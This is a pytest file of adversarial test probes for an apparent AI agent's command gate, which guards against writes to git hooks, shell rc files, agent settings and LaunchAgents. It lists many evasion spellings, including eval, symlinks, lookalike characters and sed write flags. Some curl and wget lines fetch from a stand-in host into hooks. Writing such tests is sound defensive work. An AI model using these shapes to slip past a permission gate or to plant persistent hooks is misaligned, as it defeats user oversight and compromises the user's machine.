"""Adversarial HR-3 text probes. Commands are data; only pytest calls the policy/gate.

Expectations are chosen independently of the reader. Documented residuals are
explicit misses, never silently reclassified failed hits. See the adjacent report.
"""
from __future__ import annotations

import json
import unicodedata
from dataclasses import dataclass

import pytest

from server.services import command_sandbox, hard_rules, permissions, terminal_policy as tp
from server.services.permissions import Request
from tests.server.test_hr3_run_later_text import _dispatch, _store, gate as gate


WORD = "zz-stand-in-word"
HELD = (
    ".git/hooks/pre-commit", ".git/config", ".envrc", ".vscode/tasks.json",
    ".claude/settings.json", ".mcp.json", ".npmrc", ".husky/pre-commit",
    "~/.zshrc", f"~/Library/LaunchAgents/{WORD}.plist",
)


@dataclass(frozen=True)
class Shape:
    family: str
    label: str
    command: str
    hit: bool = True
    target: str = ""
    residual: str = ""

    @property
    def id(self):
        return f"{self.family}-{self.label}"


SHAPES: list[Shape] = []


def add(family, label, command, hit=True, target="", residual=""):
    SHAPES.append(Shape(family, label, command, hit, target, residual))


# Quote removal must not hide a held component. Quoted tilde is a literal path,
# but the reader intentionally conservatively treats that spelling as home too.
for n, path in enumerate(HELD):
    letter = path.index(".") + 2
    for spelling, quoted in (
        ("single", f"'{path}'"), ("double", f'"{path}"'),
        ("escaped", path.replace(".", r"\.", 1)),
        ("escaped-letter", path[:letter] + "\\" + path[letter:]),
        ("split", path[:2] + '"' + path[2:3] + '"' + path[3:]),
        ("adjacent", f"'{path[:2]}'\"{path[2:]}\""),
        ("empty", path[:2] + "''" + path[2:]),
    ):
        add("quoting", f"{n}-{spelling}", f"echo {WORD} > {quoted}", target=path)

for n, path in enumerate(HELD[:8]):
    for label, command in (
        ("assigned", f"F={path}; echo {WORD} > $F"),
        ("braced", f"F={path}; tee ${{F}}"),
        ("double", f'F={path}; touch "$F"'),
        ("export", f"export F={path}; tee $F"),
        ("read", f"read F <<<'{path}'; tee $F"),
        ("glob", f"touch {path[:-1]}*"),
    ):
        add("variables", f"{n}-{label}", command, target=path)
for label, command in (
    ("unbound", "tee $X"), ("zero", "tee $0"), ("all", 'tee "$@"'),
    ("home", f"echo {WORD} > $HOME/.zshrc"),
    ("tilde", f"echo {WORD} > ~/.zshrc"),
    ("tilde-user", f"echo {WORD} > ~{WORD}/.zshrc"),
    ("tilde-quoted", f'echo {WORD} > "~/.zshrc"'),
):
    add("variables", label, command, target="expanded or home-level writer target")

for n, path in enumerate((HELD[0], HELD[2], HELD[8])):
    body = f"echo {WORD} > {path}"
    for label, command in (
        ("eval", f"eval '{body}'"),
        ("eval-variable", f"F='{body}'; eval \"$F\""),
        ("source", f"source {WORD}.sh {path}"),
        ("dot", f". {WORD}.sh {path}"),
        ("bash", f"bash -c '{body}'"),
        ("sh", f"sh -c '{body}'"),
        ("bash-variable", f"F='{body}'; bash -c \"$F\""),
        ("sh-variable", f"F='{body}'; sh -c \"$F\""),
        ("nested", f'bash -c "bash -c \'{body}\'"'),
    ):
        add("interpreters", f"{n}-{label}", command, target=path)
    for label, command in (
        ("subshell", f"( {body} )"), ("group", f"{{ {body}; }}"),
        ("substitution", f"echo $( {body} )"), ("backquotes", f"echo `{body}`"),
        ("pipeline", f"echo {WORD} | tee {path}"), ("background", f"{body} &"),
        ("if", f"if true; then {body}; fi"),
        ("for", f"for F in {WORD}; do {body}; done"),
        ("while", f"while true; do {body}; break; done"),
        ("case", f"case {WORD} in {WORD}) {body};; esac"),
        ("and", f"true && {body}"), ("or", f"false || {body}"),
    ):
        add("groups", f"{n}-{label}", command, target=path)
    for label, command in (
        ("redirect-last", f"cat <<EOF > {path}\n{WORD}\nEOF"),
        ("quoted-delimiter", f"cat > {path} <<'EOF'\n{WORD}\nEOF"),
        ("tabs", f"cat <<-EOF > {path}\n\t{WORD}\n\tEOF"),
        ("here-string", f"tee {path} <<<{WORD}"),
        ("body-substitution", f"cat <<EOF\n$(touch {path})\nEOF"),
    ):
        add("heredocs", f"{n}-{label}", command, target=path)
    add("heredocs", f"{n}-body-data", f"cat <<'EOF'\necho {WORD} > {path}\nEOF", False)
    for label, command in (
        ("alias", f"alias f='{body}'; f"),
        ("function", f"function f {{ {body}; }}; f"),
        ("posix-function", f"f() {{ {body}; }}; f"),
    ):
        add("definitions", f"{n}-{label}", command, target=path)

PREFIXES = (
    "env", "env -i", "command", "command -p", "builtin", "exec",
    f"exec -a {WORD}", "nohup", "time", "nice -n 1", "timeout 1",
    "caffeinate", "sudo", "npx", "xcrun", "arch -arm64",
)
for n, path in enumerate((HELD[0], HELD[4], HELD[8])):
    for p, prefix in enumerate(PREFIXES):
        add("prefixes", f"{n}-{p}", f"{prefix} touch {path}", target=path)
    add("prefixes", f"{n}-env-s", f"env -S 'touch {path}'", target=path)

for n, path in enumerate(HELD):
    add("paths", f"{n}-case", f"touch {path.upper()}", target=path)
    # ASCII held components do not change under NFC/NFD. Put a genuinely
    # decomposable character in an ancestor (or in the LaunchAgents basename).
    for form in ("NFC", "NFD"):
        accent = unicodedata.normalize(form, WORD + chr(0xE9))
        spelling = (f"{accent}/{path}" if n < 8 else
                    f"/Users/{accent}/{path[2:]}")
        add("paths", f"{n}-{form}", f"touch {spelling}", target=path)
    # A fullwidth dot is not ASCII dot; no normalization to compatibility forms.
    lookalike = path.replace(".", chr(0xFF0E), 1)
    if n == 9:
        lookalike = path.replace("LaunchAgents", chr(0xFF2C) + "aunchAgents")
    add("paths", f"{n}-lookalike", f"echo {WORD} > {lookalike}", False)
    if n >= 8:
        continue
    for label, spelling in (
        ("dot", f"./{path}"), ("slashes", path.replace("/", "//")),
        ("trailing", path + "/"), ("dot-tail", path + "/."),
        ("middle-parent", f"{WORD}/../{path}"), ("leading-parent", "../" + path),
        ("absolute", f"/Users/{WORD}/{path}"),
        ("data-volume", f"/System/Volumes/Data/Users/{WORD}/{path}"),
        ("private-var", f"/private/var/{WORD}/{path}"),
        ("dependency-prefix", f"node_modules_x/{WORD}/{path}"),
    ):
        # Trailing slash forms are conservative holds, not proof of a valid write.
        add("paths", f"{n}-{label}", f"touch {spelling}", target=path)
    add("paths", f"{n}-dependency", f"touch node_modules/{WORD}/{path}", False)

for n, folder in enumerate((".git/hooks", ".husky", "~/Library/LaunchAgents")):
    for label, command in (
        ("ln-s", f"ln -s {folder} {WORD}; echo {WORD} > {WORD}/pre-commit"),
        ("ln-sf", f"ln -sf {folder} {WORD}; touch {WORD}/pre-commit"),
        ("ln-t", f"ln -sT {folder} {WORD}; touch {WORD}/pre-commit"),
        ("cp-s", f"cp -s {folder} {WORD}; touch {WORD}/pre-commit"),
        ("move-link", f"ln -s {folder} {WORD}; mv {WORD} {WORD}-link"),
        ("install-link", f"ln -s {folder} {WORD}; install {WORD} {folder}/pre-commit"),
    ):
        # install has no portable symlink-creation flag: model a link as its input.
        add("links", f"{n}-{label}", command, target=folder)

GIT_KEYS = (
    "core.hooksPath", "core.fsmonitor", "core.sshCommand", "core.editor", "core.pager",
    "alias.zz-stand-in-word", "filter.zz-stand-in-word.clean",
    "filter.zz-stand-in-word.smudge", "filter.zz-stand-in-word.process",
    "diff.zz-stand-in-word.textconv", "credential.helper", "gpg.program", "include.path",
    "includeIf.gitdir:zz-stand-in-word.path",
)
for n, key in enumerate(GIT_KEYS):
    add("git", f"setting-{n}", f"git -c {key}={WORD} status", target=key)
    add("git", f"config-env-{n}", f"git --config-env={key}=ZZ_STAND_IN_WORD status", target=key)
for label, command in (
    ("cd", f"git -C {WORD} config core.hooksPath {WORD}"),
    ("git-dir", f"git --git-dir={WORD} config core.editor {WORD}"),
    ("git-dir-env", f"GIT_DIR={WORD} git config core.editor {WORD}"),
    ("template-env", f"GIT_TEMPLATE_DIR={WORD} git init"),
    ("set", f"git config set core.editor {WORD}"),
    ("unset", "git config unset core.editor"),
    ("type", f"git config --type=path core.hooksPath {WORD}"),
    ("file", f"git config --file .envrc core.editor {WORD}"),
    ("null", f"git config -z core.editor {WORD}"),
    ("end-options", f"git config -- core.editor {WORD}"),
    ("template", f"git init --template={WORD} {WORD}-repo"),
    ("clone-config", f"git clone -c core.hooksPath={WORD} {WORD}-source {WORD}-repo"),
    ("submodule", f"git submodule add {WORD}-source {WORD}-sub"),
    ("submodule-init", "git submodule update --init"),
    ("checkout", "git checkout HEAD -- .envrc"),
    ("restore", "git restore --source=HEAD .vscode/tasks.json"),
    ("show-redirect", "git show HEAD:.envrc > .envrc"),
    ("unknown-global", f"git --{WORD} config core.editor {WORD}"),
):
    add("git", label, command, target="git configuration, hooks, or explicit held operand")
for n, variable in enumerate(("GIT_CONFIG", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                              "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0",
                              "GIT_CONFIG_PARAMETERS")):
    add("git", f"config-variable-{n}", f"{variable}={WORD} git status", target="unknown git configuration")
for label, command in (
    ("get", "git config get core.editor"),
    ("type-get", "git config --type path --get core.hooksPath"),
    ("blob", "git config --blob HEAD:.gitconfig --get core.editor"),
    ("file-get", "git config --file .git/config --get core.editor"),
    ("null-get", "git config -z --get core.editor"),
    ("submodule-status", "git submodule status"),
    ("show-read", "git show HEAD:.envrc"),
    # Zero disables environment key/value entries; it does not write a held file.
    ("config-count-zero", "GIT_CONFIG_COUNT=0 git status"),
):
    add("git", label, command, False)

for n, path in enumerate((HELD[0], HELD[2], HELD[4])):
    for label, command in (
        ("xargs", f"echo {path} | xargs touch"),
        ("find-exec", f"find . -exec touch {path} \\;"),
        ("find-fprint", f"find . -fprint {path}"),
        ("awk", f"awk '{{print > \"{path}\"}}' {WORD}"),
        ("perl", f"perl -pi -e 's/a/b/' {path}"),
        ("python-c", f"python -c \"open('{path}', 'w')\""),
        ("python-m", f"python -m {WORD} {path}"),
        ("tar", f"tar -xf {WORD}.tar -C {path}"),
        ("unzip", f"unzip {WORD}.zip -d {path}"),
        ("curl", f"curl -o {path} https://{WORD}.invalid/{WORD}"),
        ("wget", f"wget -O {path} https://{WORD}.invalid/{WORD}"),
        ("sort", f"sort -o {path} {WORD}"),
        ("patch", f"patch {path} {WORD}.patch"),
        ("dd", f"dd if={WORD} of={path}"),
        ("install-dir", f"install -d {path}"),
        ("mkdir", f"mkdir -p {path}"),
        ("rsync", f"rsync -a {WORD} {path}"),
        ("ditto", f"ditto {WORD} {path}"),
        ("cp-target", f"cp -t {path} {WORD}"),
        ("cp-recursive", f"cp -R {WORD} {path}"),
        ("sed-separated", f"sed -i '' 's/a/b/' {path}"),
        ("sed-suffix", f"sed -i.bak 's/a/b/' {path}"),
        ("sed-cluster", f"sed -Ei 's/a/b/' {path}"),
        ("sed-long", f"sed --in-place= 's/a/b/' {path}"),
        ("sed-w-space", f"sed -n 'w {path}' {WORD}"),
        ("sed-w-joined", f"sed -n 'w{path}' {WORD}"),
        ("sed-subst-w", f"sed 's/a/b/w{path}' {WORD}"),
    ):
        add("writers", f"{n}-{label}", command, target=path)

for label, command, target in (
    ("npm", f"npm config set registry {WORD}", ".npmrc"),
    ("npm-location", f"npm --location=project config set registry {WORD}", ".npmrc"),
    ("npm-prefix", f"npm --prefix {WORD} config set registry {WORD}", ".npmrc"),
    ("npm-location-space", f"npm --location project config set registry {WORD}", ".npmrc"),
    ("pnpm", f"pnpm config set registry {WORD}", ".npmrc"),
    ("yarn", f"yarn config set {WORD} {WORD}", ".yarnrc.yml"),
    ("pip", f"pip config set global.index-url {WORD}", "pip.conf"),
    ("pre-commit", "pre-commit install", HELD[0]),
    ("husky", "husky", ".husky"), ("npx-husky", "npx husky", ".husky"),
    ("direnv", "direnv allow", ".envrc"),
):
    add("config-tools", label, command, target=target)

for n, (folder, leaf) in enumerate(((".git/hooks", "pre-commit"), (".claude", "settings.json"),
                                   ("~/Library/LaunchAgents", f"{WORD}.plist"))):
    for label, command in (
        ("cd", f"cd {folder} && echo {WORD} > {leaf}"),
        ("pushd", f"pushd {folder}; touch {leaf}"),
        ("popd", f"cd {folder}; pushd {WORD}; popd; touch {leaf}"),
        ("may-fail-semicolon", f"cd {folder}; touch {leaf}"),
        ("may-fail-or", f"cd {WORD} || cd {folder}; touch {leaf}"),
        ("cd-minus", f"cd {folder}; cd {WORD}; cd -; touch {leaf}"),
        ("expansion", f"D={folder}; cd \"$D\"; touch {leaf}"),
        ("subshell", f"(cd {folder}; touch {leaf})"),
        ("loop", f"for D in {folder}; do cd $D; touch {leaf}; done"),
        ("cdpath", f"CDPATH={folder}; cd {WORD}; touch {leaf}"),
    ):
        add("folders", f"{n}-{label}", command, target=f"{folder}/{leaf}")

for n, path in enumerate((".github/workflows/zz-stand-in-word.yml", ".gitlab-ci.yml",
                          ".circleci/config.yml", "azure-pipelines.yml", "Jenkinsfile",
                          "bitbucket-pipelines.yml", "AGENTS.md", "CLAUDE.md", "GEMINI.md",
                          ".cursorrules", f"{WORD}.txt")):
    add("exclusions", str(n), f"echo {WORD} > {path}", False)

for label, command, residual in (
    ("existing-link", f"echo {WORD} > {WORD}-link/pre-commit", "pre-existing symlink to .git/hooks"),
    ("checkout-tree", f"git checkout {WORD}", "checkout contents may include .envrc"),
    ("restore-tree", "git restore .", "restored tree may include .envrc"),
    ("merge-tree", f"git merge {WORD}", "merged tree may include .envrc"),
    ("pull-tree", "git pull", "pulled tree may include .envrc"),
    ("worktree", f"git worktree add {WORD}", "new worktree contents may include .envrc"),
    ("tar-contents", f"tar -xf {WORD}.tar -C {WORD}", "archive contents may include .envrc"),
    ("zip-contents", f"unzip {WORD}.zip -d {WORD}", "archive contents may include .envrc"),
    ("copy-tree", f"cp -R {WORD}-source {WORD}-dest", "copied tree may include .envrc"),
    ("patch-contents", f"patch -p1 < {WORD}.patch", "patch contents may name .envrc"),
    ("makefile", "make", "Makefile may write .envrc"),
    ("script-by-name", WORD, "program or script may write .envrc internally"),
    ("git-remote", f"git remote add {WORD} {WORD}-source", "other git config writer: remote add"),
    ("git-branch", f"git branch -u {WORD}", "other git config writer: branch -u"),
    ("variable-curl", f"F=.envrc; curl -o $F https://{WORD}.invalid/{WORD}", "variable in non-enumerated writer"),
):
    add("residuals", label, command, False, residual=residual)


# These eight former strict xfails now require passing parser and gate assertions.
FIXED_WRITES = {
    *(f"writers-{n}-{label}" for n in range(3) for label in ("sed-w-joined", "sed-subst-w")),
    "config-tools-npm-prefix", "config-tools-npm-location-space",
}

for label, command, target in (
    ("sed-W", f"sed -n 'W.envrc' {WORD}", ".envrc"),
    ("gsed-W-space", f"gsed -n 'W .envrc' {WORD}", ".envrc"),
    ("sed-expressions", f"sed -e p -e 'w.envrc' {WORD}", ".envrc"),
    ("sed-expression-long", f"sed --expression='w.envrc' {WORD}", ".envrc"),
    ("sed-expression-separate", f"sed --expression 'w.envrc' {WORD}", ".envrc"),
    ("sed-expression-joined", f"sed -ew.envrc {WORD}", ".envrc"),
    ("sed-flags", f"sed 's/a/b/2gpIw.envrc' {WORD}", ".envrc"),
    ("sed-flags-space", f"sed 's/a/b/gw .envrc' {WORD}", ".envrc"),
    ("sed-escaped", rf"sed 's/a\/b/c\/d/w.envrc' {WORD}", ".envrc"),
    ("sed-delimiter", f"sed 's#a/b#c/d#w.envrc' {WORD}", ".envrc"),
    ("sed-group", f"sed '1,2{{p;w.envrc\n}}' {WORD}", ".envrc"),
    ("sed-newline", f"sed 'p\nw.envrc' {WORD}", ".envrc"),
    ("sed-address", f"sed '/w/!w.envrc' {WORD}", ".envrc"),
    ("sed-filename-rest", f"sed 'w.git/hooks/{WORD} with blanks;tail' {WORD}",
     f".git/hooks/{WORD} with blanks;tail"),
    ("sed-file", f"sed -f {WORD} {WORD}", tp.RUN_LATER_UNKNOWN),
    ("sed-file-joined", f"gsed -f{WORD} {WORD}", tp.RUN_LATER_UNKNOWN),
    ("sed-file-long", f"sed --file={WORD} {WORD}", tp.RUN_LATER_UNKNOWN),
    ("sed-file-separate", f"sed --file {WORD} {WORD}", tp.RUN_LATER_UNKNOWN),
    ("npm-alias", f"npm c set registry {WORD}", ".npmrc"),
    ("npm-pair-anywhere", f"npm {WORD} config set registry {WORD}", ".npmrc"),
    ("npm-between-verbs", f"npm config --location project set registry {WORD}", ".npmrc"),
    ("npm-unknown-value", f"npm config --{WORD} {WORD} set registry {WORD}", ".npmrc"),
    ("npm-unknown-flag", f"npm --{WORD} config set registry {WORD}", ".npmrc"),
    ("yarn-unknown-both", f"yarn --{WORD} config --{WORD} {WORD} set key {WORD}", ".yarnrc.yml"),
    ("pip-flags", f"pip --isolated --require-virtualenv -v config set key {WORD}", "pip.conf"),
    ("pip-version", f"pip3.11 config set key {WORD}", "pip.conf"),
    ("python-pip", f"python -m pip config set key {WORD}", "pip.conf"),
    ("python3-pip", f"python3 -m pip config set key {WORD}", "pip.conf"),
    ("python-version-pip", f"python3.11 -m pip --python {WORD} config set key {WORD}", "pip.conf"),
    ("npm-expansion", f"npm --prefix {WORD} config $VERB key {WORD}", tp.RUN_LATER_UNKNOWN),
):
    add("parser", label, command, target=target)

for program, options, target in (
    ("npm", ("--prefix", "--location", "--userconfig", "--globalconfig", "--workspace", "-w",
             "--registry", "--cache", "--loglevel", "--otp"), ".npmrc"),
    ("pnpm", ("--cwd", "-C", "--dir", "--filter", "-F", "--prefix"), ".npmrc"),
    ("yarn", ("--cwd", "-C", "--dir", "--filter", "-F", "--prefix"), ".yarnrc.yml"),
    ("pip", ("--python", "--cache-dir", "--log"), "pip.conf"),
):
    for n, option in enumerate(options):
        add("parser", f"{program}-option-{n}", f"{program} {option} {WORD} config set key {WORD}",
            target=target)
        add("parser", f"{program}-value-control-{n}", f"{program} get {option} config set key", False)

for label, command in (
    ("sed-substitution", f"sed 's/a/b/' {WORD}"),
    ("sed-replacement-w", f"sed 's/a/w.envrc/' {WORD}"),
    ("sed-replacement-delimiter", rf"sed 's/a/\/w.envrc/' {WORD}"),
    ("sed-replacement-semicolon", f"sed 's/a/b;w.envrc/' {WORD}"),
    ("sed-address-w", f"sed '/w.envrc/p' {WORD}"),
    ("sed-text-w", f"sed 'a\\text;w.envrc' {WORD}"),
    ("sed-input-is-not-script", "sed -e p w.envrc"),
    ("sed-file-after-end-options", f"sed -- p -f {WORD}"),
    ("npm-read", f"npm --prefix {WORD} config get registry"),
    ("npm-alias-read", "npm c get registry"),
    ("pip-read", f"python3.11 -m pip --python {WORD} config list"),
    ("pip-other-module", f"python3.11 -m {WORD} config set key {WORD}"),
    ("other-tool", f"{WORD} config set key {WORD}"),
    ("hook-tool-prefix", f"pre-commit {WORD} install"),
):
    add("parser", label, command, False)


def params(shapes):
    return [pytest.param(s, id=s.id) for s in shapes]


@pytest.mark.parametrize("shape", params(SHAPES))
def test_run_later_shape(shape, record_property):
    found = tp.run_later_targets(shape.command)
    for key, value in (("family", shape.family), ("command", shape.command),
                       ("expected_hit", shape.hit), ("targets", json.dumps(found)),
                       ("target", shape.target), ("residual", shape.residual)):
        record_property(key, value)
    assert bool(found) is shape.hit, (shape.id, shape.command, shape.target, found)


@pytest.mark.parametrize("shape", params([s for s in SHAPES if s.hit]))
def test_every_expected_hit_is_never_auto(shape):
    request = Request(kind="command", target="text:" + shape.command,
                      title=WORD, detail=shape.command)
    assert hard_rules.never_auto(request), (shape.id, shape.command)


@pytest.mark.parametrize("shape", params([s for s in SHAPES if s.family == "parser" and s.hit]))
def test_parser_write_names_its_target(shape):
    assert shape.target in tp.run_later_targets(shape.command), shape.id


# Deliberately diverse stable IDs, not a selection filtered by the implementation.
GATE_IDS = (
    "quoting-0-single", "quoting-4-empty", "quoting-8-split",
    "variables-0-assigned", "variables-2-glob", "interpreters-0-eval",
    "interpreters-1-nested", "groups-0-subshell", "groups-1-pipeline",
    "groups-2-case", "heredocs-0-tabs", "heredocs-1-here-string",
    "definitions-0-function", "prefixes-1-0", "prefixes-0-env-s",
    "paths-0-case", "paths-2-NFD", "paths-4-dependency-prefix",
    "links-0-ln-s", "git-setting-0", "git-config-env-10", "git-set",
    "writers-0-find-exec", "writers-1-sed-cluster", "config-tools-npm",
    "folders-0-popd", "folders-1-expansion",
) + tuple(sorted(FIXED_WRITES))
GATE_SHAPES = [s for key in GATE_IDS for s in SHAPES if s.id == key]
# The forms the reader refuses, whose answer is unknown: the gate once cleared that unknown before checking for the
# user's click, so a yes recorded as a grant reached the executor (⓪Plan's review, blocker 2). Fixed: they are in the
# matrix below with no mark, and in the outside card's test after it.
GATE_UNKNOWN_UNREAD = (
    "variables-0-assigned", "interpreters-0-eval", "definitions-0-function",
    "prefixes-0-env-s", "writers-0-find-exec",
)
GATE_PARAMS = params(GATE_SHAPES)


async def remembered(command, argv, **kwargs):
    permissions.LAST_DECISION.set(permissions.Decision(True, "grant", "conversation"))
    return True


@pytest.mark.parametrize("shape", GATE_PARAMS)
@pytest.mark.parametrize("mode", ("outside-grant", "sandbox-off-grant", "sandbox-off-rule",
                                  "sandbox-off-text-grant", "seatbelt-unavailable"))
async def test_click_lift_matrix(execution_db, gate, monkeypatch, shape, mode, record_property):
    assert tp.run_later_targets(shape.command), shape.id
    if mode == "outside-grant":
        await _store("outside", "*")
    else:
        if mode == "seatbelt-unavailable":
            monkeypatch.setattr(command_sandbox, "available", lambda: False)
        else:
            gate["sandbox"] = False
        gate["ask_all"] = mode == "sandbox-off-text-grant"
        target = "text:" + shape.command if gate["ask_all"] else "unsandboxed:*"
        await _store("command", target, rule=mode == "sandbox-off-rule")
    runs, frames, _ = await _dispatch(monkeypatch, {"command": shape.command})
    record_property("command", shape.command)
    record_property("mode", mode)
    record_property("clicked_cards", json.dumps([f["options"] for f in frames]))
    record_property("clicked_runs", json.dumps(runs))
    assert len(frames) == 1 and frames[0]["options"] == ["once"], frames
    assert len(runs) == 1 and runs[0][1] is False, runs
    runs, _, result = await _dispatch(monkeypatch, {"command": shape.command}, confirm=remembered)
    record_property("grant_callback_runs", json.dumps(runs))
    assert runs == [], (shape.id, result)


@pytest.mark.parametrize("shape", params([s for key in GATE_UNKNOWN_UNREAD for s in SHAPES if s.id == key]))
async def test_an_unread_unknown_on_the_outside_card_needs_the_users_click(execution_db, gate, monkeypatch, shape):
    # Blocker 2 on the outside card's path: the model asks to leave the sandbox; a yes that is not the user's click on
    # that card (here, one recorded as a grant) runs nothing, as for a known hit. The user's click runs it.
    assert tp.run_later_targets(shape.command) == [tp.RUN_LATER_UNKNOWN], shape.id
    args = {"command": shape.command, "outside_sandbox": True, "why": WORD}
    runs, _, result = await _dispatch(monkeypatch, args, confirm=remembered)
    assert runs == [] and result.get("executed") is False, (shape.id, result)
    runs, frames, _ = await _dispatch(monkeypatch, args)
    assert len(frames) == 1 and len(runs) == 1 and runs[0][0] is True, (shape.id, runs, frames)


@pytest.mark.parametrize("shape", params([s for s in SHAPES if s.id in FIXED_WRITES]))
@pytest.mark.parametrize("mode", ("outside-grant", "sandbox-off-grant", "sandbox-off-rule"))
async def test_missed_write_still_requires_its_card(execution_db, gate, monkeypatch, shape,
                                                  mode, record_property):
    if mode == "outside-grant":
        await _store("outside", "*")
    else:
        gate["sandbox"] = False
        await _store("command", "unsandboxed:*", rule=mode == "sandbox-off-rule")
    runs, frames, _ = await _dispatch(monkeypatch, {"command": shape.command})
    record_property("command", shape.command)
    record_property("mode", mode)
    record_property("cards", json.dumps([f["options"] for f in frames]))
    record_property("runs", json.dumps(runs))
    assert len(frames) == 1 and frames[0]["options"] == ["once"], (runs, frames)


@pytest.mark.parametrize("shape", params([s for s in SHAPES if "sudo touch" in s.command]))
async def test_sudo_stays_refused(execution_db, gate, monkeypatch, shape):
    await _store("outside", "*")
    runs, frames, result = await _dispatch(monkeypatch, {"command": shape.command})
    assert runs == [] and frames == [], (runs, frames, result)


def test_corpus_inventory():
    assert len(SHAPES) >= 150
    assert len({s.command for s in SHAPES}) >= 150
    assert len({s.id for s in SHAPES}) == len(SHAPES)
    assert len(GATE_SHAPES) == len(GATE_IDS) >= 20
    assert FIXED_WRITES <= {s.id for s in SHAPES if s.hit}


def test_target_order_and_deduplication():
    assert tp.run_later_targets("touch .envrc .npmrc .envrc; tee .git/config") == [
        ".envrc", ".npmrc", ".git/config"]


def test_existing_link_is_a_pure_text_residual(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    link = tmp_path / f"{WORD}-link"
    link.symlink_to(tmp_path / ".git" / "hooks", target_is_directory=True)
    assert tp.run_later_targets(f"echo {WORD} > {WORD}-link/pre-commit") == []
